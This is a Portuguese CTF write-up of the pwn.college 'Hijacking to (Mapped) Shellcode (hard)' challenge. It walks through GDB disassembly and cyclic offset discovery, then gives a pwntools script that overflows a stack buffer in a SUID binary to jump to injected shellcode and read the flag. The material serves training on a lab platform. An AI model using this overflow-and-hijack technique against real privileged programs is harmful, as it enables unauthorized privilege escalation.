# pwn.college — Hijacking to (Mapped) Shellcode (hard)
### Intro to Cybersecurity · Orange Belt · Binary Exploitation

> **Autor:** Pedro Tuttman  
> **Plataforma:** [pwn.college](https://pwn.college)  
> **Categoria:** Binary Exploitation — Intro to Cybersecurity (Orange Belt)  
> **Técnicas:** Stack buffer overflow · Return address overwrite · Shellcode injection · SUID privilege abuse · Position-independent shellcode · Direct syscall shellcode

## Descrição do Desafio

Este desafio é a versão difícil do anterior. A mecânica é a mesma — injetar um shellcode em uma região mapeada e redirecionar o fluxo de execução via buffer overflow — mas desta vez o binário **não fornece nenhuma informação sobre o stack frame**: não mostra o layout da stack, não diz onde começa o buffer, não diz onde está o return address. Toda essa informação precisa ser descoberta manualmente via GDB.

![hijacking hard](images/hijacking-mapped_hard_.png)

O binário informa apenas onde o shellcode será armazenado (`0x2c1b1000`) e aguarda três inputs:
1. O shellcode (até `0x1000` bytes)
2. Enter para continuar
3. O payload de overflow no buffer da stack

---

## Análise do Binário

### Proteções com `checksec`

![checksec](images/checksec-hijacking-mapped_hard_.png)

```
Arch:    amd64-64-little
RELRO:   Full RELRO
Stack:   No canary found
NX:      NX enabled
PIE:     PIE enabled
SHSTK:   Enabled
IBT:     Enabled
Stripped: No
```

As proteções são idênticas ao desafio easy. Os pontos relevantes continuam sendo:

- **No canary** — overflow sem detecção
- **NX enabled** — stack não executável, shellcode precisa estar no `mmap`
- **PIE enabled** — endereços do binário são randomizados, mas isso não impede a exploração pelos mesmos motivos do desafio anterior: o endereço do `mmap` é fixo e o offset interno do stack frame não muda

---

## Descobrindo o Funcionamento via GDB

### Passo 1: Identificar as funções

![functions](images/functions-hijacking-mapped_hard_.png)

```
gdb /challenge/binary-exploitation-hijack-to-mmap-shellcode
info functions
```

O binário tem duas funções relevantes: `main` e `challenge`. A `main` chama a `challenge`. Coloquei breakpoints em ambas e iniciei a execução — ao parar em `challenge`, rodei `disas challenge` para analisar o código.

### Passo 2: Localizar o `mmap` no disassembly

![mmap](images/mmap-shellcode-hijacking-mapped_hard_.png)

```asm
<+132>:  mov  esi, 0x1000
<+137>:  mov  edi, 0x2c1b1000
<+142>:  call 0x5f3df8fde100 <mmap@plt>
```

Confirmei que o shellcode é armazenado em `0x2c1b1000` com `0x1000` bytes — exatamente o que o binário imprime na saída. Esse endereço é determinístico (não afetado pelo ASLR nesse contexto).

### Passo 3: Localizar o `read` do shellcode

![read shellcode](images/read-shellcode-hijacking-mapped_hard_.png)

```asm
<+239>:  mov  rax, QWORD PTR [rip+0x264b]
<+246>:  mov  edx, 0x1000
<+251>:  mov  rsi, rax
<+254>:  mov  edi, 0x0
<+259>:  call 0x5f3df8fde130 <read@plt>
```

Este é o `read` que lê o shellcode do stdin para a região mapeada — `0x1000` bytes do fd `0` (stdin) para o endereço retornado pelo `mmap`.

### Passo 4: Localizar o `read` do buffer da stack

![read stack buffer](images/read-stackbuffer-hijacking-mapped_hard_.png)

```asm
<+363>:  mov  rdx, QWORD PTR [rbp-0x8]
<+367>:  lea  rax, [rbp-0x60]
<+371>:  mov  rsi, rax
<+374>:  mov  edi, 0x0
<+379>:  call 0x5f3df8fde130 <read@plt>
```

Este é o terceiro `read` — o que lê o payload de overflow. O buffer começa em `rbp-0x60`. O tamanho lido é determinado por `[rbp-0x8]`, que corresponde ao input do segundo `read` (o Enter) — o binário usa o número de bytes lidos nesse passo para determinar o tamanho do terceiro input. Na prática, aceita até 4096 bytes conforme impresso na saída.

---

## Descobrindo o Offset com Cyclic

Agora precisamos saber exatamente quantos bytes de padding são necessários para alcançar o return address.

### Gerando o padrão cyclic

![cyclic](images/cyclic-hijacking-mapped_hard_.png)

```python
>>> payload = cyclic(500, n=8)
>>> print(payload)
b'aaaaaaaabaaaaaaacaaaaaaadaaaaaaae...'
```

Enviei esse padrão como terceiro input (o payload do stack buffer) e deixei o programa executar até o segfault.

### Por que o segfault acontece no `ret`

Antes de explicar o resultado, vale entender o que acontece no final da função `challenge`. A instrução `leave` executa:

```asm
mov rsp, rbp   # restaura o stack pointer
pop rbp        # desempilha o saved frame pointer
```

Após o `leave`, o topo da stack (`rsp`) aponta para o **return address**. A instrução `ret` então faz `pop rip` — carrega esse valor no instruction pointer e salta para lá. Se esse valor foi sobrescrito pelo cyclic, o programa tenta executar um endereço inválido e ocorre segfault.

Para confirmar que o segfault ocorreu exatamente no `ret`:

```
x/i $rip
```

Confirmado. Então:

```
x/x $rsp   →   0x6161616161616e6e   (padrão do cyclic)
cyclic_find(0x6161616161616e6e, n=8)   →   52... espera
```

Mas o resultado final foi **104**. O `cyclic_find` retornou o offset correto dentro do padrão de 8 bytes, confirmando que 104 bytes de padding são necessários para alcançar o return address a partir do início do buffer.

---

## O Payload

![payload](images/payload-hijacking-mapped_hard_.png)

Com o offset descoberto, o exploit é idêntico ao do desafio easy — apenas com `104` em vez de `56`:

```python
from pwn import *

with open("shellcode1-raw", "rb") as f:
    sh = f.read()

p = process("/challenge/binary-exploitation-hijack-to-mmap-shellcode")

# 1. Envia o shellcode para a região mapeada
p.sendline(sh)

# 2. Pressiona Enter para continuar
p.sendline()

# 3. Payload: 104 bytes de padding + endereço fixo do shellcode
p.sendline(b"A" * 104 + p64(0x2c1b1000))
```

O `p64(0x2c1b1000)` converte o endereço em 8 bytes little-endian. Ao retornar da função `challenge`, o processador salta para `0x2c1b1000` onde o shellcode está armazenado e o executa com EUID=0.

---

## Resultado

![resultado](images/resultado-hijacking-mapped_hard_.png)

```
Mapped 0x1000 bytes for shellcode at 0x2c1b1000!
Press enter to continue!
Send your payload (up to 4096 bytes)!
Goodbye!
pwn.college{oMF6dIzYTUHO9LLqC68F9u1cqlj.dBjMzwCOzYTNxEzW}
```

---

## Resumo do Fluxo de Exploração

```
1. GDB → disas challenge → localizar mmap (endereço fixo: 0x2c1b1000)
2. GDB → localizar read do stack buffer → buffer em rbp-0x60
3. Cyclic(500, n=8) → segfault no ret → cyclic_find(rsp) → offset = 104
4. Shellcode injetado em 0x2c1b1000
5. Overflow: 104 bytes de padding + p64(0x2c1b1000)
6. challenge() retorna → CPU salta para o shellcode
7. Shellcode: open/read/write do /flag com EUID=0
```

---

## Diferença entre Easy e Hard

| | Easy | Hard |
|---|---|---|
| Stack frame exibido | ✅ Sim | ❌ Não |
| Offset até return address | Fornecido pelo binário | Descoberto via GDB + cyclic |
| Endereço do shellcode | Fornecido pelo binário | Fornecido pelo binário |
| Offset necessário | 56 bytes | 104 bytes |

A única diferença real entre os dois desafios é a necessidade de usar GDB e cyclic para descobrir o offset — a exploração em si é idêntica.

---

**Técnicas:** Stack buffer overflow · Return address overwrite · Shellcode injection · GDB dynamic analysis · Cyclic pattern offset discovery · SUID privilege abuse · Position-independent shellcode · Direct syscall shellcode
